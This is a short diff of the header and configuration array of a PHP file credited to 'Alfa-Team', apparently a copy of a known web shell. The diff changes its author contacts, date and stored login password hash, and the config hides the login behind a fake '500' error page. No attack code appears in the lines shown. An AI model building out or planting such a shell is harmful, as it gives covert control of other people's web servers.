@@ -1,14 +1,14 @@
 <?php
 /*
 	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://t.me/keccy
-	Channel: 	https://t.me/deathbase
-	Gmail:		ryphon@proton.me
-	Date:		Monday, May 10, 2025
+	Telegram: 	https://telegram.me/solevisible
+	YouTube: 	https://youtube.com/solevisible
+	Gmail:		solevisible@gmail.com
+	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'death',
-    'password' => '4a8a08f09d37b73795649038408b5f33',
+    'password' => '2e8d6dbf9112a879d4ceb15403d10a78',
     'safe_mode' => '1',
     'login_page' => '500',
     'show_icons' => '1',
